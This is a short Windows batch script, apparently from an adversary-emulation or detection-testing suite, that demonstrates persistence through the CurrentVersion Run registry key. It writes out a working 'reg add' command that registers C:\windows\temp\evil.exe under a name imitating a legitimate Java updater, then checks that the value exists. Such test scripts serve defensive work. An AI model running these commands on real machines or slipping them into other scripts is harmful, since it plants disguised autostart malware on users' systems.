@ECHO OFF

ECHO ===========================================================================
ECHO Persistence
ECHO Persistence - CurrentVersion run key
ping -n 5 127.0.0.1 > NUL

reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v JUSCHED /d C:\windows\temp\evil.exe /f
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v JUSCHED
